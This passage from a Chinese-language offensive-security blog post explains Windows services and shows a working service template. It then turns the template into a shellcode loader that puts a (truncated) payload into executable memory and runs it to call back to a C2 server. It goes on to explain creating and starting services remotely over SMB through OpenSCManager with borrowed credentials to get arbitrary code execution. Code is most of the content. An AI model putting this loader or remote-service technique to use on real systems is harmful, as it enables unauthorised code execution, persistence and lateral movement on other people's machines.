<p>&lt;!JEKYLL@5920@15&gt;</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1751da6474c932f7644f8a7cb7450867.png" alt="2020-04-01-14-36-24"></p>

<p>在Win2008上的查看：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/9673d1575dce4bff91aabee07cdc61b3.png" alt="2020-04-01-14-36-42"></p>

<p>文件写入成功。</p>

<h2 id="0x05-编写服务程序">0x05 编写服务程序</h2>

<p>Windows 服务被设计用于需要在后台运行的应用程序以及实现没有用户交互的任务，并且部分服务是以SYSTEM权限启动。为了编写服务程序，我们需要了解一些关于服务的概念。</p>

<p>服务控制管理器（SCM：<code class="language-plaintext highlighter-rouge">Services Control Manager</code>）是一个管理系统所有服务的进程。当 SCM 启动某个服务时，它等待某个进程的主线程来调用 StartServiceCtrlDispatcher 函数。将分派表传递给 StartServiceCtrlDispatcher。这将把调用进程的主线程转换为控制分派器。该分派器启动一个新线程，该线程运行分派表中每个服务的 ServiceMain 函数分派器还监视程序中所有服务的执行情况。然后分派器将控制请求从 SCM 传给服务。</p>

<h3 id="servicemain-函数">ServiceMain 函数</h3>

<p>该函数是服务的入口点。它运行在一个单独的线程当中，这个线程是由控制分派器创建的。ServiceMain 应该尽可能早早为服务注册控制处理器。这要通过调用 RegisterServiceCtrlHadler 函数来实现。</p>

<p>这里可以直接提供一个服务模板：</p>
<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;  
</span><span class="c1">// Windows 服务代码模板</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="c1">// sc create Monitor binpath= Monitor.exe</span>
<span class="c1">// sc start Monitor</span>
<span class="c1">// sc delete Monitor</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="cm">/**********************************************************************************/</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="c1">// New-Service –Name Monitor –DisplayName Monitor –BinaryPathName "D:\Monitor\Monitor.exe" –StartupType Automatic</span>
<span class="c1">// Start-Service Monitor</span>
<span class="c1">// Stop-Service Monitor</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>



<span class="cp">#define SLEEP_TIME 5000                          </span><span class="cm">/*间隔时间*/</span><span class="cp">
#define LOGFILE "D:\log.txt"              </span><span class="cm">/*信息输出文件*/</span><span class="cp">
</span>
<span class="n">SERVICE_STATUS</span> <span class="n">ServiceStatus</span><span class="p">;</span>  <span class="cm">/*服务状态*/</span>
<span class="n">SERVICE_STATUS_HANDLE</span> <span class="n">hStatus</span><span class="p">;</span> <span class="cm">/*服务状态句柄*/</span>

<span class="kt">void</span>  <span class="nf">ServiceMain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">);</span>
<span class="kt">void</span>  <span class="nf">CtrlHandler</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">request</span><span class="p">);</span>
<span class="kt">int</span>   <span class="nf">InitService</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">CHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">WserviceName</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Monitor"</span><span class="p">);</span>
    <span class="n">SERVICE_TABLE_ENTRY</span> <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lpServiceName</span> <span class="o">=</span> <span class="n">WserviceName</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lpServiceProc</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSERVICE_MAIN_FUNCTION</span><span class="p">)</span><span class="n">ServiceMain</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lpServiceName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lpServiceProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">StartServiceCtrlDispatcher</span><span class="p">(</span><span class="n">ServiceTable</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">WriteToLog</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span><span class="o">*</span> <span class="n">pfile</span><span class="p">;</span>
    <span class="n">fopen_s</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pfile</span><span class="p">,</span> <span class="n">LOGFILE</span><span class="p">,</span> <span class="s">"a+"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">pfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">fprintf_s</span><span class="p">(</span><span class="n">pfile</span><span class="p">,</span> <span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">pfile</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*Service initialization*/</span>
<span class="kt">int</span> <span class="nf">InitService</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">CHAR</span> <span class="n">Message</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"Monitoring started."</span><span class="p">;</span>
    <span class="n">OutputDebugString</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"Monitoring started."</span><span class="p">));</span>
    <span class="kt">int</span> <span class="n">result</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">WriteToLog</span><span class="p">(</span><span class="n">Message</span><span class="p">);</span>

    <span class="k">return</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*Control Handler*/</span>
<span class="kt">void</span> <span class="nf">CtrlHandler</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">request</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">request</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">SERVICE_CONTROL_STOP</span><span class="p">:</span>
        
        <span class="n">WriteToLog</span><span class="p">(</span><span class="s">"Monitoring stopped."</span><span class="p">);</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">SERVICE_CONTROL_SHUTDOWN</span><span class="p">:</span>
        <span class="n">WriteToLog</span><span class="p">(</span><span class="s">"Monitoring stopped."</span><span class="p">);</span>

        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="nl">default:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* Report current status  */</span>
    <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">ServiceMain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">WserviceName</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Monitor"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">error</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwServiceType</span> <span class="o">=</span>
        <span class="n">SERVICE_WIN32</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span>
        <span class="n">SERVICE_START_PENDING</span><span class="p">;</span>
    <span class="cm">/*在本例中只接受系统关机和停止服务两种控制命令*/</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwControlsAccepted</span> <span class="o">=</span>
        <span class="n">SERVICE_ACCEPT_SHUTDOWN</span> <span class="o">|</span>
        <span class="n">SERVICE_ACCEPT_STOP</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwServiceSpecificExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCheckPoint</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">hStatus</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegisterServiceCtrlHandler</span><span class="p">(</span>
        <span class="n">WserviceName</span><span class="p">,</span>
        <span class="p">(</span><span class="n">LPHANDLER_FUNCTION</span><span class="p">)</span><span class="n">CtrlHandler</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hStatus</span> <span class="o">==</span> <span class="p">(</span><span class="n">SERVICE_STATUS_HANDLE</span><span class="p">)</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>

        <span class="n">WriteToLog</span><span class="p">(</span><span class="s">"RegisterServiceCtrlHandler failed"</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">WriteToLog</span><span class="p">(</span><span class="s">"RegisterServiceCtrlHandler success"</span><span class="p">);</span>
    <span class="cm">/* Initialize Service   */</span>
    <span class="n">error</span> <span class="o">=</span> <span class="n">InitService</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="cm">/* Initialization failed  */</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span>
            <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/*向SCM 报告运行状态*/</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span>
        <span class="n">SERVICE_RUNNING</span><span class="p">;</span>
    <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>

    <span class="cm">/*do something you want to do in this while loop*/</span>
    <span class="n">MEMORYSTATUS</span> <span class="n">memstatus</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">==</span>
        <span class="n">SERVICE_RUNNING</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
        <span class="n">GlobalMemoryStatus</span><span class="p">(</span><span class="o">&amp;</span><span class="n">memstatus</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">availmb</span> <span class="o">=</span> <span class="n">memstatus</span><span class="p">.</span><span class="n">dwAvailPhys</span> <span class="o">/</span> <span class="mi">1024</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">;</span>
        <span class="n">sprintf_s</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"available memory is %dMB"</span><span class="p">,</span> <span class="n">availmb</span><span class="p">);</span>
        <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">WriteToLog</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
            <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
            <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span>
                <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">Sleep</span><span class="p">(</span><span class="n">SLEEP_TIME</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">WriteToLog</span><span class="p">(</span><span class="s">"service stopped"</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>源代码：<a href="https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp">https://github.com/Rvn0xsy/MyWin32CPP/blob/master/WindowsService.cpp</a></p>

<p>创建一个控制台应用程序，将源代码编译后就可以创建服务了，该服务会每隔5秒向<code class="language-plaintext highlighter-rouge">D:\log.txt</code></p>

<p>写入信息。这里如果展开讲会花费不少时间，我直接把<code class="language-plaintext highlighter-rouge">SERVICE_RUNNING</code> 状态下的代码进行更改，使其执行Shellcode上线。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;  
</span><span class="c1">// Windows 服务代码模板</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="c1">// sc create Monitor binpath= Monitor.exe</span>
<span class="c1">// sc start Monitor</span>
<span class="c1">// sc delete Monitor</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="cm">/**********************************************************************************/</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>
<span class="c1">// New-Service –Name Monitor –DisplayName Monitor –BinaryPathName "D:\Monitor\Monitor.exe" –StartupType Automatic</span>
<span class="c1">// Start-Service Monitor</span>
<span class="c1">// Stop-Service Monitor</span>
<span class="c1">////////////////////////////////////////////////////////////////////////////////////</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
<span class="s">"</span><span class="se">\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff</span><span class="s">"</span>
<span class="c1">// ..............</span>
<span class="s">"</span><span class="se">\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="n">SERVICE_STATUS</span> <span class="n">ServiceStatus</span><span class="p">;</span>  <span class="cm">/*服务状态*/</span>
<span class="n">SERVICE_STATUS_HANDLE</span> <span class="n">hStatus</span><span class="p">;</span> <span class="cm">/*服务状态句柄*/</span>

<span class="kt">void</span>  <span class="nf">ServiceMain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">);</span>
<span class="kt">void</span>  <span class="nf">CtrlHandler</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">request</span><span class="p">);</span>
<span class="kt">int</span>   <span class="nf">InitService</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">CHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">WserviceName</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Monitor"</span><span class="p">);</span>
    <span class="n">SERVICE_TABLE_ENTRY</span> <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lpServiceName</span> <span class="o">=</span> <span class="n">WserviceName</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">lpServiceProc</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPSERVICE_MAIN_FUNCTION</span><span class="p">)</span><span class="n">ServiceMain</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lpServiceName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">ServiceTable</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">lpServiceProc</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">StartServiceCtrlDispatcher</span><span class="p">(</span><span class="n">ServiceTable</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="cm">/*Service initialization*/</span>
<span class="kt">int</span> <span class="nf">InitService</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/*Control Handler*/</span>
<span class="kt">void</span> <span class="nf">CtrlHandler</span><span class="p">(</span><span class="n">DWORD</span> <span class="n">request</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">request</span><span class="p">)</span>
    <span class="p">{</span>
    <span class="k">case</span> <span class="n">SERVICE_CONTROL_STOP</span><span class="p">:</span>

        
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">SERVICE_CONTROL_SHUTDOWN</span><span class="p">:</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="nl">default:</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* Report current status  */</span>
    <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">ServiceMain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">WCHAR</span> <span class="n">WserviceName</span><span class="p">[]</span> <span class="o">=</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Monitor"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">error</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwServiceType</span> <span class="o">=</span>
        <span class="n">SERVICE_WIN32</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span>
        <span class="n">SERVICE_START_PENDING</span><span class="p">;</span>
    <span class="cm">/*在本例中只接受系统关机和停止服务两种控制命令*/</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwControlsAccepted</span> <span class="o">=</span>
        <span class="n">SERVICE_ACCEPT_SHUTDOWN</span> <span class="o">|</span>
        <span class="n">SERVICE_ACCEPT_STOP</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwServiceSpecificExitCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCheckPoint</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWaitHint</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">hStatus</span> <span class="o">=</span> <span class="o">::</span><span class="n">RegisterServiceCtrlHandler</span><span class="p">(</span>
        <span class="n">WserviceName</span><span class="p">,</span>
        <span class="p">(</span><span class="n">LPHANDLER_FUNCTION</span><span class="p">)</span><span class="n">CtrlHandler</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">hStatus</span> <span class="o">==</span> <span class="p">(</span><span class="n">SERVICE_STATUS_HANDLE</span><span class="p">)</span><span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* Initialize Service   */</span>
    <span class="n">error</span> <span class="o">=</span> <span class="n">InitService</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="cm">/* Initialization failed  */</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_STOPPED</span><span class="p">;</span>
        <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwWin32ExitCode</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// 在这里执行Shellcode</span>
    <span class="n">LPVOID</span> <span class="n">Memory</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">Memory</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
    <span class="p">((</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">Memory</span><span class="p">)();</span>

    <span class="cm">/*向SCM 报告运行状态*/</span>
    <span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">=</span> <span class="n">SERVICE_RUNNING</span><span class="p">;</span>
    <span class="n">SetServiceStatus</span><span class="p">(</span><span class="n">hStatus</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ServiceStatus</span><span class="p">);</span>

    <span class="cm">/*do something you want to do in this while loop*/</span>
    <span class="n">MEMORYSTATUS</span> <span class="n">memstatus</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">ServiceStatus</span><span class="p">.</span><span class="n">dwCurrentState</span> <span class="o">==</span> <span class="n">SERVICE_RUNNING</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Sleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<h2 id="0x06-使用windows-api远程管理服务">0x06 使用Windows API远程管理服务</h2>

<p>前面说到，Windows的服务都由服务控制管理器（SCM：<code class="language-plaintext highlighter-rouge">Services Control Manager</code>）进行管理，我们可以通过Windows API去连接SCM，当服务程序上传到服务器上以后，创建一个服务，把<code class="language-plaintext highlighter-rouge">binpath</code>指向服务程序的路径，再对服务进行启动就可以达到任意代码执行的效果。</p>

<p>注意：远程连接SCM还是走的SMB协议 445端口，SMB V2可以明显看到流量内容。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SC_HANDLE</span> <span class="nf">OpenSCManagerA</span><span class="p">(</span>
  <span class="n">LPCSTR</span> <span class="n">lpMachineName</span><span class="p">,</span> <span class="c1">// 目标计算机的名称。</span>
  <span class="n">LPCSTR</span> <span class="n">lpDatabaseName</span><span class="p">,</span> <span class="c1">// 服务控制管理器数据库的名称</span>
  <span class="n">DWORD</span>  <span class="n">dwDesiredAccess</span> <span class="c1">// 访问权限列表</span>
<span class="p">);</span>
</code></pre></div></div>

<p>如果当前用户在连接到另一台计算机上的服务时没有适当的访问权限，则 <code class="language-plaintext highlighter-rouge">OpenSCManager</code>函数调用将失败。若要远程连接到服务，请在调用<code class="language-plaintext highlighter-rouge">OpenSCManager</code>之前使用LOGON32_LOGON_NEW_CREDENTIALS 调用<code class="language-plaintext highlighter-rouge">LogonUser</code>函数，然后调用<code class="language-plaintext highlighter-rouge">ImpersonateLoggedOnUser</code>。</p>

<p>这里需要注意的是，通过<code class="language-plaintext highlighter-rouge">WNetAddConnection2</code>认证后，再去调用OpenSCManager是不需要认证的。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CreateServiceWithSCM</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSCMServer</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServiceName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsServicePath</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">wcout</span> <span class="o">&lt;&lt;</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Will Create Service "</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="n">lpwsServiceName</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">hSCM</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">hService</span><span class="p">;</span>
    <span class="n">SERVICE_STATUS</span> <span class="n">ss</span><span class="p">;</span>
    <span class="c1">// GENERIC_WRITE = STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG</span>
    <span class="n">hSCM</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span><span class="n">lpwsSCMServer</span><span class="p">,</span> <span class="n">SERVICES_ACTIVE_DATABASE</span><span class="p">,</span> <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>
